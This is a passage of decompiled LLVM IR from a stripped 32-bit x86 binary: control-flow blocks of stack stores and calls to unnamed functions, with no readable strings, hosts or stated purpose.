  %v3_804f837 = inttoptr i32 %v2_804f837 to i32*
  store i32 %v3_804f834, i32* %v3_804f837, align 4
  %v0_804f838 = call i32 @function_8051696()
  store i32 %v0_804f838, i32* %eax.global-to-local, align 4
  %v0_804f840 = load i32, i32* @edi, align 4
  %v1_804f840 = add i32 %v0_804f840, 12
  %v2_804f840 = inttoptr i32 %v1_804f840 to i32*
  store i32 5, i32* %v2_804f840, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f84c:                             ; preds = %dec_label_pc_804f240, %dec_label_pc_804f240, %dec_label_pc_804f240, %dec_label_pc_804f240, %dec_label_pc_804f240
  %v1_804f84c = add i32 %v0_804f84c, 1
  store i32 %v1_804f84c, i32* @ebp, align 4
  %v10_804f84f = icmp eq i32 %v0_804f84c, -2
  br i1 %v10_804f84f, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f858

dec_label_pc_804f858:                             ; preds = %dec_label_pc_804f84c
  %tmp186 = icmp slt i32 %v1_804f84c, 1
  br i1 %tmp186, label %dec_label_pc_804f56b, label %dec_label_pc_804f860

dec_label_pc_804f860:                             ; preds = %dec_label_pc_804f858
  %v0_804f860 = load i32, i32* @esp, align 4
  %v1_804f863 = add i32 %v0_804f860, -16
  %v2_804f863 = inttoptr i32 %v1_804f863 to i32*
  store i32 5, i32* %v2_804f863, align 4
  %v0_804f865 = call i32 @function_8050470()
  store i32 %v0_804f865, i32* %eax.global-to-local, align 4
  %v0_804f86a = load i32, i32* @esp, align 4
  %v1_804f86a = inttoptr i32 %v0_804f86a to i32*
  %v2_804f86a = load i32, i32* %v1_804f86a, align 4
  store i32 %v2_804f86a, i32* %eax.global-to-local, align 4
  %v3_804f86a = add i32 %v0_804f86a, 4
  %v1_804f86b = inttoptr i32 %v3_804f86a to i32*
  %v1_804f86c = add i32 %v0_804f86a, 1928
  store i32 %v1_804f86c, i32* %edx.global-to-local, align 4
  store i32 %v1_804f86c, i32* %v1_804f86b, align 4
  store i32 5, i32* %v1_804f86a, align 4
  %v0_804f876 = call i32 @function_80503c0()
  store i32 %v0_804f876, i32* %eax.global-to-local, align 4
  %v0_804f87b = load i32, i32* @esp, align 4
  %v1_804f87b = add i32 %v0_804f87b, -4
  %v2_804f87b = inttoptr i32 %v1_804f87b to i32*
  store i32 16384, i32* %v2_804f87b, align 4
  %v1_804f880 = add i32 %v0_804f87b, 1928
  %v2_804f880 = inttoptr i32 %v1_804f880 to i32*
  %v3_804f880 = load i32, i32* %v2_804f880, align 4
  store i32 %v3_804f880, i32* @esi, align 4
  %v2_804f887 = add i32 %v0_804f87b, -8
  %v3_804f887 = inttoptr i32 %v2_804f887 to i32*
  store i32 %v3_804f880, i32* %v3_804f887, align 4
  %v2_804f888 = add i32 %v0_804f87b, -12
  %v3_804f888 = inttoptr i32 %v2_804f888 to i32*
  store i32 %v0_804f876, i32* %v3_804f888, align 4
  %v0_804f889 = load i32, i32* @edi, align 4
  %v1_804f889 = add i32 %v0_804f889, 4
  %v2_804f889 = inttoptr i32 %v1_804f889 to i32*
  %v3_804f889 = load i32, i32* %v2_804f889, align 4
  store i32 %v3_804f889, i32* @ebx, align 4
  %v2_804f88c = add i32 %v0_804f87b, -16
  %v3_804f88c = inttoptr i32 %v2_804f88c to i32*
  store i32 %v3_804f889, i32* %v3_804f88c, align 4
  %v0_804f88d = call i32 @function_8051696()
  store i32 %v0_804f88d, i32* %eax.global-to-local, align 4
  %v0_804f892 = load i32, i32* @esp, align 4
  %v1_804f895 = add i32 %v0_804f892, 28
  %v2_804f895 = inttoptr i32 %v1_804f895 to i32*
  store i32 16384, i32* %v2_804f895, align 4
  %v1_804f89a = add i32 %v0_804f892, 24
  %v2_804f89a = inttoptr i32 %v1_804f89a to i32*
  store i32 2, i32* %v2_804f89a, align 4
  %v1_804f89c = add i32 %v0_804f892, 20
  %v2_804f89c = inttoptr i32 %v1_804f89c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f89c, align 4
  %v0_804f8a1 = load i32, i32* @edi, align 4
  %v1_804f8a1 = add i32 %v0_804f8a1, 4
  %v2_804f8a1 = inttoptr i32 %v1_804f8a1 to i32*
  %v3_804f8a1 = load i32, i32* %v2_804f8a1, align 4
  store i32 %v3_804f8a1, i32* %ecx.global-to-local, align 4
  %v2_804f8a4 = add i32 %v0_804f892, 16
  %v3_804f8a4 = inttoptr i32 %v2_804f8a4 to i32*
  store i32 %v3_804f8a1, i32* %v3_804f8a4, align 4
  %v0_804f8a5 = call i32 @function_8051696()
  store i32 %v0_804f8a5, i32* %eax.global-to-local, align 4
  %v0_804f8aa = load i32, i32* @esp, align 4
  %v1_804f8aa = inttoptr i32 %v0_804f8aa to i32*
  store i32 5, i32* %v1_804f8aa, align 4
  %v0_804f8b1 = call i32 @function_80503f0()
  store i32 %v0_804f8b1, i32* %eax.global-to-local, align 4
  %v0_804f8b9 = load i32, i32* @edi, align 4
  %v1_804f8b9 = add i32 %v0_804f8b9, 12
  %v2_804f8b9 = inttoptr i32 %v1_804f8b9 to i32*
  store i32 6, i32* %v2_804f8b9, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f8c5:                             ; preds = %dec_label_pc_804f1fb, %dec_label_pc_804f1fb, %dec_label_pc_804f1fb, %dec_label_pc_804f1fb, %dec_label_pc_804f1fb
  %v1_804f8c5 = add i32 %v0_804f8c5, 1
  store i32 %v1_804f8c5, i32* @ebp, align 4
  %v10_804f8c8 = icmp eq i32 %v0_804f8c5, -2
  %v1_804f8cb = icmp eq i1 %v10_804f8c8, false
  br i1 %v1_804f8cb, label %dec_label_pc_804f9cc, label %dec_label_pc_804f8d1

dec_label_pc_804f8d1:                             ; preds = %dec_label_pc_804f22c, %dec_label_pc_804f8c5, %dec_label_pc_804f1ef
  %v0_804f8d1 = load i32, i32* @esp, align 4
  %v1_804f8d4 = add i32 %v0_804f8d1, -16
  %v2_804f8d4 = inttoptr i32 %v1_804f8d4 to i32*
  store i32 26, i32* %v2_804f8d4, align 4
  %v0_804f8d6 = call i32 @function_8050470()
  store i32 %v0_804f8d6, i32* %eax.global-to-local, align 4
  %v0_804f8db = load i32, i32* @esp, align 4
  %v1_804f8db = inttoptr i32 %v0_804f8db to i32*
  store i32 27, i32* %v1_804f8db, align 4
  %v0_804f8e2 = call i32 @function_8050470()
  store i32 %v0_804f8e2, i32* %eax.global-to-local, align 4
  %v0_804f8e7 = load i32, i32* @esp, align 4
  %v1_804f8e7 = inttoptr i32 %v0_804f8e7 to i32*
  %v2_804f8e7 = load i32, i32* %v1_804f8e7, align 4
  store i32 %v2_804f8e7, i32* %ecx.global-to-local, align 4
  %v3_804f8e7 = add i32 %v0_804f8e7, 4
  %v1_804f8e8 = inttoptr i32 %v3_804f8e7 to i32*
  %v2_804f8e8 = load i32, i32* %v1_804f8e8, align 4
  store i32 %v2_804f8e8, i32* %ebx.global-to-local, align 4
  %v1_804f8e9 = add i32 %v0_804f8e7, 1928
  store i32 %v1_804f8e9, i32* %edx.global-to-local, align 4
  store i32 %v1_804f8e9, i32* %v1_804f8e8, align 4
  store i32 26, i32* %v1_804f8e7, align 4
  %v0_804f8f3 = call i32 @function_80503c0()
  store i32 %v0_804f8f3, i32* %eax.global-to-local, align 4
  store i32 %v0_804f8f3, i32* @ebx, align 4
  %v0_804f8fa = load i32, i32* @esp, align 4
  %v1_804f8fa = inttoptr i32 %v0_804f8fa to i32*
  %v2_804f8fa = load i32, i32* %v1_804f8fa, align 4
  store i32 %v2_804f8fa, i32* %eax.global-to-local, align 4
  %v3_804f8fa = add i32 %v0_804f8fa, 4
  %v1_804f8fb = inttoptr i32 %v3_804f8fa to i32*
  %v2_804f8fb = load i32, i32* %v1_804f8fb, align 4
  store i32 %v2_804f8fb, i32* %edx.global-to-local, align 4
  %v1_804f8fc = add i32 %v0_804f8fa, 1928
  store i32 %v1_804f8fc, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f8fc, i32* %v1_804f8fb, align 4
  store i32 27, i32* %v1_804f8fa, align 4
  %v0_804f906 = call i32 @function_80503c0()
  store i32 %v0_804f906, i32* %eax.global-to-local, align 4
  store i32 %v0_804f906, i32* @esi, align 4
  %v0_804f90d = load i32, i32* @esp, align 4
  %v1_804f90d = add i32 %v0_804f90d, 1928
  %v2_804f90d = inttoptr i32 %v1_804f90d to i32*
  %v3_804f90d = load i32, i32* %v2_804f90d, align 4
  %v1_804f914 = add i32 %v3_804f90d, -1
  store i32 %v1_804f914, i32* %eax.global-to-local, align 4
  %v2_804f915 = add i32 %v0_804f90d, -4
  %v3_804f915 = inttoptr i32 %v2_804f915 to i32*
  store i32 %v1_804f914, i32* %v3_804f915, align 4
  %v0_804f916 = load i32, i32* @ebx, align 4
  %v2_804f916 = add i32 %v0_804f90d, -8
  %v3_804f916 = inttoptr i32 %v2_804f916 to i32*
  store i32 %v0_804f916, i32* %v3_804f916, align 4
  %v0_804f917 = load i32, i32* @edi, align 4
  %v1_804f917 = add i32 %v0_804f917, 24
  %v2_804f917 = inttoptr i32 %v1_804f917 to i32*
  %v3_804f917 = load i32, i32* %v2_804f917, align 4
  store i32 %v3_804f917, i32* %eax.global-to-local, align 4
  %v2_804f91a = add i32 %v0_804f90d, -12
  %v3_804f91a = inttoptr i32 %v2_804f91a to i32*
  store i32 %v3_804f917, i32* %v3_804f91a, align 4
  %v1_804f91b = add i32 %v0_804f90d, 28
  %v2_804f91b = inttoptr i32 %v1_804f91b to i32*
  %v3_804f91b = load i32, i32* %v2_804f91b, align 4
  store i32 %v3_804f91b, i32* %eax.global-to-local, align 4
  %v2_804f91f = add i32 %v0_804f90d, -16
  %v3_804f91f = inttoptr i32 %v2_804f91f to i32*
  store i32 %v3_804f91b, i32* %v3_804f91f, align 4
  %v0_804f920 = call i32 @function_8050af0()
  %v0_804f925 = load i32, i32* @esp, align 4
  %v1_804f925 = add i32 %v0_804f925, 32
  %v8_804f928 = icmp eq i32 %v0_804f920, -1
  %v1_804f929 = icmp eq i1 %v8_804f928, false
  %v2_804f929 = zext i1 %v1_804f929 to i32
  %v2_804f92c = icmp eq i1 %v1_804f929, false
  store i32 %v2_804f929, i32* %eax.global-to-local, align 4
  store i32 %v2_804f929, i32* @ebp, align 4
  %v1_804f935 = icmp eq i1 %v2_804f92c, false
  br i1 %v1_804f935, label %dec_label_pc_804f965, label %dec_label_pc_804f937

dec_label_pc_804f937:                             ; preds = %dec_label_pc_804f8d1
  %v1_804f937 = add i32 %v0_804f925, 1944
  %v2_804f937 = inttoptr i32 %v1_804f937 to i32*
  %v3_804f937 = load i32, i32* %v2_804f937, align 4
  %v1_804f93e = add i32 %v3_804f937, -1
  store i32 %v1_804f93e, i32* %eax.global-to-local, align 4
  %v2_804f93f = add i32 %v0_804f925, 28
  %v3_804f93f = inttoptr i32 %v2_804f93f to i32*
  store i32 %v1_804f93e, i32* %v3_804f93f, align 4
  %v0_804f940 = load i32, i32* @esi, align 4
  %v2_804f940 = add i32 %v0_804f925, 24
  %v3_804f940 = inttoptr i32 %v2_804f940 to i32*
  store i32 %v0_804f940, i32* %v3_804f940, align 4
  %v0_804f941 = load i32, i32* @edi, align 4
  %v1_804f941 = add i32 %v0_804f941, 24
  %v2_804f941 = inttoptr i32 %v1_804f941 to i32*
  %v3_804f941 = load i32, i32* %v2_804f941, align 4
  store i32 %v3_804f941, i32* %eax.global-to-local, align 4
  %v2_804f944 = add i32 %v0_804f925, 20
  %v3_804f944 = inttoptr i32 %v2_804f944 to i32*
  store i32 %v3_804f941, i32* %v3_804f944, align 4
  %v1_804f945 = add i32 %v0_804f925, 44
  %v2_804f945 = inttoptr i32 %v1_804f945 to i32*
  %v3_804f945 = load i32, i32* %v2_804f945, align 4
  %v2_804f949 = add i32 %v0_804f925, 16
  %v3_804f949 = inttoptr i32 %v2_804f949 to i32*
  store i32 %v3_804f945, i32* %v3_804f949, align 4
  %v0_804f94a = call i32 @function_8050af0()
  %v0_804f94f = load i32, i32* @esp, align 4
  %v1_804f94f = add i32 %v0_804f94f, 16
  %v8_804f952 = icmp eq i32 %v0_804f94a, -1
  %v1_804f953 = icmp eq i1 %v8_804f952, false
  %v2_804f953 = zext i1 %v1_804f953 to i32
  %v2_804f956 = icmp eq i1 %v1_804f953, false
  store i32 %v2_804f953, i32* %eax.global-to-local, align 4
  store i32 %v2_804f953, i32* @ebp, align 4
  br i1 %v2_804f956, label %dec_label_pc_804faf0, label %dec_label_pc_804f965

dec_label_pc_804f965:                             ; preds = %dec_label_pc_804f937, %dec_label_pc_804f8d1
  %v0_804f965 = phi i32 [ %v1_804f94f, %dec_label_pc_804f937 ], [ %v1_804f925, %dec_label_pc_804f8d1 ]
  %v1_804f968 = add i32 %v0_804f965, -16
  %v2_804f968 = inttoptr i32 %v1_804f968 to i32*
  store i32 26, i32* %v2_804f968, align 4
  %v0_804f96a = call i32 @function_80503f0()
  store i32 %v0_804f96a, i32* %eax.global-to-local, align 4
  %v0_804f96f = load i32, i32* @esp, align 4
  %v1_804f96f = inttoptr i32 %v0_804f96f to i32*
  store i32 27, i32* %v1_804f96f, align 4
  %v0_804f976 = call i32 @function_80503f0()
  store i32 %v0_804f976, i32* %eax.global-to-local, align 4
  %v0_804f97e = load i32, i32* @ebp, align 4
  %v10_804f97e = icmp eq i32 %v0_804f97e, -1
  br i1 %v10_804f97e, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f987

dec_label_pc_804f987:                             ; preds = %dec_label_pc_804f965, %dec_label_pc_804f9cc
  %v0_804f987 = phi i32 [ %v0_804f97e, %dec_label_pc_804f965 ], [ %v0_804f987.pre, %dec_label_pc_804f9cc ]
  %v0_804f993.in = load i32, i32* @esp, align 4
  %tmp187 = icmp slt i32 %v0_804f987, 1
  br i1 %tmp187, label %dec_label_pc_804f56b, label %dec_label_pc_804f98f

dec_label_pc_804f98f:                             ; preds = %dec_label_pc_804f987
  %v0_804f98f = load i32, i32* @edi, align 4
  %v1_804f98f = inttoptr i32 %v0_804f98f to i32*
  %v2_804f98f = load i32, i32* %v1_804f98f, align 4
  store i32 %v2_804f98f, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f993 = add i32 %v0_804f993.in, 12
  %v2_804f993 = inttoptr i32 %v1_804f993 to i32*
  store i32 16384, i32* %v2_804f993, align 4
  %v0_804f998 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f998 = add i32 %v0_804f998, 12
  %v2_804f998 = inttoptr i32 %v1_804f998 to i8*
  %v3_804f998 = load i8, i8* %v2_804f998, align 1
  %v4_804f998 = zext i8 %v3_804f998 to i32
  %v5_804f998 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f998 = and i32 %v5_804f998, -256
  %v7_804f998 = or i32 %v6_804f998, %v4_804f998
  store i32 %v7_804f998, i32* %eax.global-to-local, align 4
  %v2_804f99b = add i32 %v0_804f993.in, 8
  %v3_804f99b = inttoptr i32 %v2_804f99b to i32*
  store i32 %v7_804f998, i32* %v3_804f99b, align 4
  %v0_804f99c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f99c = inttoptr i32 %v0_804f99c to i32*
  %v2_804f99c = load i32, i32* %v1_804f99c, align 4
  store i32 %v2_804f99c, i32* @esi, align 4
  %v2_804f99e = add i32 %v0_804f993.in, 4
  %v3_804f99e = inttoptr i32 %v2_804f99e to i32*
  store i32 %v2_804f99c, i32* %v3_804f99e, align 4
  %v0_804f99f = load i32, i32* @edi, align 4
  %v1_804f99f = add i32 %v0_804f99f, 4
  %v2_804f99f = inttoptr i32 %v1_804f99f to i32*
  %v3_804f99f = load i32, i32* %v2_804f99f, align 4
  store i32 %v3_804f99f, i32* @ebx, align 4
  %v3_804f9a2 = inttoptr i32 %v0_804f993.in to i32*
  store i32 %v3_804f99f, i32* %v3_804f9a2, align 4
  %v0_804f9a3 = call i32 @function_8051696()
  store i32 %v0_804f9a3, i32* %eax.global-to-local, align 4
  %v0_804f9a8 = load i32, i32* @esp, align 4
  %v1_804f9a8 = add i32 %v0_804f9a8, -4
  %v2_804f9a8 = inttoptr i32 %v1_804f9a8 to i32*
  store i32 16384, i32* %v2_804f9a8, align 4
  %v1_804f9ad = add i32 %v0_804f9a8, -8
  %v2_804f9ad = inttoptr i32 %v1_804f9ad to i32*
  store i32 2, i32* %v2_804f9ad, align 4
  %v1_804f9af = add i32 %v0_804f9a8, -12
  %v2_804f9af = inttoptr i32 %v1_804f9af to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f9af, align 4
  %v0_804f9b4 = load i32, i32* @edi, align 4
  %v1_804f9b4 = add i32 %v0_804f9b4, 4
  %v2_804f9b4 = inttoptr i32 %v1_804f9b4 to i32*
  %v3_804f9b4 = load i32, i32* %v2_804f9b4, align 4
  store i32 %v3_804f9b4, i32* %ecx.global-to-local, align 4
  %v2_804f9b7 = add i32 %v0_804f9a8, -16
  %v3_804f9b7 = inttoptr i32 %v2_804f9b7 to i32*
  store i32 %v3_804f9b4, i32* %v3_804f9b7, align 4
  %v0_804f9b8 = call i32 @function_8051696()
  store i32 %v0_804f9b8, i32* %eax.global-to-local, align 4
  %v0_804f9c0 = load i32, i32* @edi, align 4
  %v1_804f9c0 = add i32 %v0_804f9c0, 12
  %v2_804f9c0 = inttoptr i32 %v1_804f9c0 to i32*
  store i32 4, i32* %v2_804f9c0, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f9cc:                             ; preds = %dec_label_pc_804f8c5
  %v0_804f9cc = load i32, i32* @esp, align 4
  %v1_804f9cf = add i32 %v0_804f9cc, -16
  %v2_804f9cf = inttoptr i32 %v1_804f9cf to i32*
  store i32 26, i32* %v2_804f9cf, align 4
  %v0_804f9d1 = call i32 @function_80503f0()
  store i32 %v0_804f9d1, i32* %eax.global-to-local, align 4
  %v0_804f9d6 = load i32, i32* @esp, align 4
  %v1_804f9d6 = inttoptr i32 %v0_804f9d6 to i32*
  store i32 27, i32* %v1_804f9d6, align 4
  %v0_804f9dd = call i32 @function_80503f0()
  store i32 %v0_804f9dd, i32* %eax.global-to-local, align 4
  %v0_804f987.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f987

dec_label_pc_804f9e7:                             ; preds = %dec_label_pc_804f79b
  %v0_804f9e7 = load i32, i32* @esp, align 4
  %v1_804f9ea = add i32 %v0_804f9e7, -16
  %v2_804f9ea = inttoptr i32 %v1_804f9ea to i32*
  store i32 25, i32* %v2_804f9ea, align 4
  %v0_804f9ec = call i32 @function_80503f0()
  store i32 %v0_804f9ec, i32* %eax.global-to-local, align 4
  %v0_804f806.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f806

dec_label_pc_804f9f9:                             ; preds = %dec_label_pc_804f478
  store i32 9, i32* %v1_804fa03, align 4
  %v0_804fa0a = call i32 @function_8050470()
  store i32 %v0_804fa0a, i32* %eax.global-to-local, align 4
  %v0_804fa0f = load i32, i32* @esp, align 4
  %v1_804fa0f = inttoptr i32 %v0_804fa0f to i32*
  %v3_804fa0f = add i32 %v0_804fa0f, 4
  %v1_804fa10 = inttoptr i32 %v3_804fa0f to i32*
  %v2_804fa10 = load i32, i32* %v1_804fa10, align 4
  store i32 %v2_804fa10, i32* %eax.global-to-local, align 4
  %v1_804fa11 = add i32 %v0_804fa0f, 1928
  store i32 %v1_804fa11, i32* %edx.global-to-local, align 4
  store i32 %v1_804fa11, i32* %v1_804fa10, align 4
  store i32 9, i32* %v1_804fa0f, align 4
  %v0_804fa1b = call i32 @function_80503c0()
  store i32 %v0_804fa1b, i32* %eax.global-to-local, align 4
  %v0_804fa20 = load i32, i32* @esp, align 4
  %v1_804fa20 = add i32 %v0_804fa20, 1928
  %v2_804fa20 = inttoptr i32 %v1_804fa20 to i32*
  %v3_804fa20 = load i32, i32* %v2_804fa20, align 4
  %v1_804fa27 = add i32 %v3_804fa20, -1
  store i32 %v1_804fa27, i32* %edx.global-to-local, align 4
  %v2_804fa28 = add i32 %v0_804fa20, -4
  %v3_804fa28 = inttoptr i32 %v2_804fa28 to i32*
  store i32 %v1_804fa27, i32* %v3_804fa28, align 4
  %v2_804fa29 = add i32 %v0_804fa20, -8
  %v3_804fa29 = inttoptr i32 %v2_804fa29 to i32*
  store i32 %v0_804fa1b, i32* %v3_804fa29, align 4
  %v0_804fa2a = load i32, i32* @edi, align 4
  %v1_804fa2a = add i32 %v0_804fa2a, 24
  %v2_804fa2a = inttoptr i32 %v1_804fa2a to i32*
  %v3_804fa2a = load i32, i32* %v2_804fa2a, align 4
  store i32 %v3_804fa2a, i32* @esi, align 4
  %v2_804fa2d = add i32 %v0_804fa20, -12
  %v3_804fa2d = inttoptr i32 %v2_804fa2d to i32*
  store i32 %v3_804fa2a, i32* %v3_804fa2d, align 4
  %v1_804fa2e = add i32 %v0_804fa20, 28
  %v2_804fa2e = inttoptr i32 %v1_804fa2e to i32*
  %v3_804fa2e = load i32, i32* %v2_804fa2e, align 4
  store i32 %v3_804fa2e, i32* @ebx, align 4
  %v2_804fa32 = add i32 %v0_804fa20, -16
  %v3_804fa32 = inttoptr i32 %v2_804fa32 to i32*
  store i32 %v3_804fa2e, i32* %v3_804fa32, align 4
  %v0_804fa33 = call i32 @function_8050af0()
  store i32 %v0_804fa33, i32* %eax.global-to-local, align 4
  %v0_804fa38 = load i32, i32* @esp, align 4
  store i32 %v0_804fa33, i32* @ebp, align 4
  %v1_804fa3d = add i32 %v0_804fa38, 16
  %v2_804fa3d = inttoptr i32 %v1_804fa3d to i32*
  store i32 9, i32* %v2_804fa3d, align 4
  %v0_804fa3f = call i32 @function_80503f0()
  store i32 %v0_804fa3f, i32* %eax.global-to-local, align 4
  %v0_804fa44 = load i32, i32* @esp, align 4
  %v0_804fa47 = load i32, i32* @ebp, align 4
  %v10_804fa47 = icmp eq i32 %v0_804fa47, -1
  br i1 %v10_804fa47, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804fa50

dec_label_pc_804fa50:                             ; preds = %dec_label_pc_804f9f9
  %tmp188 = icmp slt i32 %v0_804fa47, 1
  br i1 %tmp188, label %dec_label_pc_804f56b, label %dec_label_pc_804fa58

dec_label_pc_804fa58:                             ; preds = %dec_label_pc_804fa50
  %v0_804fa58 = load i32, i32* @edi, align 4
  %v1_804fa58 = add i32 %v0_804fa58, 20
  %v2_804fa58 = inttoptr i32 %v1_804fa58 to i32*
  %v3_804fa58 = load i32, i32* %v2_804fa58, align 4
  store i32 %v3_804fa58, i32* %edx.global-to-local, align 4
  %v1_804fa5b = add i32 %v0_804fa58, 16
  %v2_804fa5b = inttoptr i32 %v1_804fa5b to i32*
  %v3_804fa5b = load i32, i32* %v2_804fa5b, align 4
  store i32 %v3_804fa5b, i32* %eax.global-to-local, align 4
  %v1_804fa5e = inttoptr i32 %v0_804fa58 to i32*
  %v2_804fa5e = load i32, i32* %v1_804fa5e, align 4
  store i32 %v2_804fa5e, i32* @esi, align 4
  %v2_804fa60 = add i32 %v0_804fa44, 1936
  %v3_804fa60 = inttoptr i32 %v2_804fa60 to i32*
  store i32 %v3_804fa5b, i32* %v3_804fa60, align 4
  %v0_804fa67 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa67 = trunc i32 %v0_804fa67 to i16
  %v2_804fa67 = load i32, i32* @esp, align 4
  %v3_804fa67 = add i32 %v2_804fa67, 1930
  %v4_804fa67 = inttoptr i32 %v3_804fa67 to i16*
  store i16 %v1_804fa67, i16* %v4_804fa67, align 2
  %v0_804fa6f = call i32 @function_8050f91()
  store i32 %v0_804fa6f, i32* %eax.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_804fa6f, 1
  br i1 %tmp189, label %dec_label_pc_804fb69, label %dec_label_pc_804fa7c

dec_label_pc_804fa7c:                             ; preds = %dec_label_pc_804fb69, %dec_label_pc_804fa58, %dec_label_pc_804fbee
  %v0_804fa7c = load i32, i32* @esp, align 4
  %v0_804fa7f = load i32, i32* @edi, align 4
  %v1_804fa7f = add i32 %v0_804fa7f, 4
  %v2_804fa7f = inttoptr i32 %v1_804fa7f to i32*
  %v3_804fa7f = load i32, i32* %v2_804fa7f, align 4
  store i32 %v3_804fa7f, i32* @esi, align 4
  %v2_804fa82 = add i32 %v0_804fa7c, -16
  %v3_804fa82 = inttoptr i32 %v2_804fa82 to i32*
  store i32 %v3_804fa7f, i32* %v3_804fa82, align 4
  %v1_804fa83 = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fa83, i32* %eax.global-to-local, align 4
  %v0_804fa8b = load i32, i32* @edi, align 4
  %v1_804fa8b = add i32 %v0_804fa8b, 4
  %v2_804fa8b = inttoptr i32 %v1_804fa8b to i32*
  store i32 -1, i32* %v2_804fa8b, align 4
  %v0_804fa92 = load i32, i32* @edi, align 4
  %v1_804fa92 = add i32 %v0_804fa92, 12
  %v2_804fa92 = inttoptr i32 %v1_804fa92 to i32*
  store i32 0, i32* %v2_804fa92, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804faa0:                             ; preds = %dec_label_pc_804f4b5
  store i32 %v0_804faa0, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_804faa5 = call i32 @function_804d840()
  store i32 %v0_804faa5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804faaf:                             ; preds = %dec_label_pc_804f5ff
  %v1_804faaf = add i32 %v0_804f5eb, -4
  %v2_804faaf = inttoptr i32 %v1_804faaf to i32*
  store i32 16384, i32* %v2_804faaf, align 4
  %v1_804fab4 = add i32 %v0_804f5eb, -8
  %v2_804fab4 = inttoptr i32 %v1_804fab4 to i32*
  store i32 3, i32* %v2_804fab4, align 4
  %v1_804fab6 = add i32 %v0_804f5eb, 1927
  store i32 %v1_804fab6, i32* %ecx.global-to-local, align 4
  %v0_804fabd = load i32, i32* @ebx, align 4
  %v1_804fabd = add i32 %v0_804fabd, 3
  store i32 %v1_804fabd, i32* @ebx, align 4
  %v2_804fac0 = add i32 %v0_804f5eb, -12
  %v3_804fac0 = inttoptr i32 %v2_804fac0 to i32*
  store i32 %v1_804fab6, i32* %v3_804fac0, align 4
  %v0_804fac1 = load i32, i32* @ebp, align 4
  %v1_804fac1 = add i32 %v0_804fac1, 3
  store i32 %v1_804fac1, i32* @ebp, align 4
  %v0_804fac4 = load i32, i32* @edi, align 4
  %v1_804fac4 = add i32 %v0_804fac4, 4
  %v2_804fac4 = inttoptr i32 %v1_804fac4 to i32*
  %v3_804fac4 = load i32, i32* %v2_804fac4, align 4
  store i32 %v3_804fac4, i32* %eax.global-to-local, align 4
  %v2_804fac7 = add i32 %v0_804f5eb, -16
  %v3_804fac7 = inttoptr i32 %v2_804fac7 to i32*
  store i32 %v3_804fac4, i32* %v3_804fac7, align 4
  %v0_804fac8 = call i32 @function_8051696()
  %v0_804facd = load i32, i32* @esp, align 4
  %v1_804facd = add i32 %v0_804facd, -4
  %v2_804facd = inttoptr i32 %v1_804facd to i32*
  store i32 16384, i32* %v2_804facd, align 4
  %v1_804fad2 = add i32 %v0_804facd, -8
  %v2_804fad2 = inttoptr i32 %v1_804fad2 to i32*
  store i32 9, i32* %v2_804fad2, align 4
  %v1_804fad4 = add i32 %v0_804facd, 1911
  store i32 %v1_804fad4, i32* %eax.global-to-local, align 4
  %v2_804fadb = add i32 %v0_804facd, -12
  %v3_804fadb = inttoptr i32 %v2_804fadb to i32*
  store i32 %v1_804fad4, i32* %v3_804fadb, align 4
  %v0_804fadc = load i32, i32* @edi, align 4
  %v1_804fadc = add i32 %v0_804fadc, 4
  %v2_804fadc = inttoptr i32 %v1_804fadc to i32*
  %v3_804fadc = load i32, i32* %v2_804fadc, align 4
  store i32 %v3_804fadc, i32* %eax.global-to-local, align 4
  %v2_804fadf = add i32 %v0_804facd, -16
  %v3_804fadf = inttoptr i32 %v2_804fadf to i32*
  store i32 %v3_804fadc, i32* %v3_804fadf, align 4
  %v0_804fae0 = call i32 @function_8051696()
  store i32 %v0_804fae0, i32* %eax.global-to-local, align 4
  %v0_804fae5 = load i32, i32* @esp, align 4
  %v1_804fae5 = add i32 %v0_804fae5, 32
  %v0_804fae8 = load i32, i32* @edi, align 4
  %v1_804fae8 = add i32 %v0_804fae8, 24
  %v2_804fae8 = inttoptr i32 %v1_804fae8 to i32*
  %v3_804fae8 = load i32, i32* %v2_804fae8, align 4
  store i32 %v3_804fae8, i32* %edx.global-to-local, align 4
  %v0_804f165.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f165.backedge

dec_label_pc_804faf0:                             ; preds = %dec_label_pc_804f937
  %v2_804faf3 = inttoptr i32 %v0_804f94f to i32*
  store i32 26, i32* %v2_804faf3, align 4
  %v0_804faf5 = call i32 @function_80503f0()
  store i32 %v0_804faf5, i32* %eax.global-to-local, align 4
  %v0_804fafa = load i32, i32* @esp, align 4
  %v1_804fafa = inttoptr i32 %v0_804fafa to i32*
  store i32 27, i32* %v1_804fafa, align 4
  %v0_804fb01 = call i32 @function_80503f0()
  store i32 %v0_804fb01, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0d6.backedge

